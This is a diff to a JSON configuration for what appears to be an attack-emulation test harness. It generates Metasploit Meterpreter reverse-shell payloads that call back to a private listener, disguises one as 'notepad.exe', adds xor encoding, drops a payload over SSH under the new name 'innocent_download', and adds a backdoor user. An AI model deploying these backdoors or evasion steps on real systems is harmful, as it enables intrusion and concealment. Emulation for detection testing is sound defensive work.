@@ -3,7 +3,7 @@
     "serial": 11248585048,
     "actions": [
         { "name":"DockerCompose", "action":"up", "compose":"docker/metasploit.yml", "skip":false },
-        { "name":"MSFVenom", "payload":"linux/x64/meterpreter_reverse_https", "skip":false, "platform":"linux", "lhost":"10.0.0.190", "lport":8843, "format":"elf", "output":"backdoor-linux" },
+        { "name":"MSFVenom", "payload":"linux/x64/meterpreter_reverse_https", "encoder":"x64/xor", "iterations":10, "skip":false, "platform":"linux", "lhost":"10.0.0.190", "lport":8843, "format":"elf", "output":"backdoor-linux" },
         { "name":"MSFVenom", "payload":"windows/x64/meterpreter_reverse_https", "skip":false, "platform":"windows", "lhost":"10.0.0.190", "lport":8443, "format":"exe", "output":"notepad.exe" },
         { "name":"MSFVenomCompileToEXE", "payload":"windows/x64/powershell_reverse_tcp_ssl", "arch":"x64", "encrypt":"aes256", "encrypt-iv":"E7a0eCX7f6F0YzS4", "encrypt-key":"6ASMkFslyhwXehNZw048cF1Vh1ACzyyR", "skip":false, "platform":"windows", "lhost":"10.0.0.190", "lport":8943, "format":"exe", "encoder":"x64/xor", "iterations":10, "output":"pwsh.exe" },
         {
@@ -31,7 +31,7 @@
             "override_password": "password",
             "actions": [
                 { "name":"ExecuteCommand", "command":"ps -ef", "connection":"ssh" },
-                { "name":"FileSystemWrite", "connection":"ssh", "remote_file":"/home/sysadmin/this_is_malware", "local_file":"./docker/payloads/meterpreter-linux"},
+                { "name":"FileSystemWrite", "connection":"ssh", "remote_file":"/home/sysadmin/innocent_download", "local_file":"./docker/payloads/meterpreter-linux"},
                 { "name":"AddUser", "skip":false, "connection":"ssh", "username_to_add":"baduser", "new_password":"P@ssw0rd1!" },
                 { "name":"HTTPGet", "skip":false, "connection":"ssh", "url":"https://github.com/redcanaryco/atomic-red-team/raw/refs/heads/master/atomics/T1218/bin/calc.dll", "local_file":"/home/sysadmin/calc.dll" }
             ]
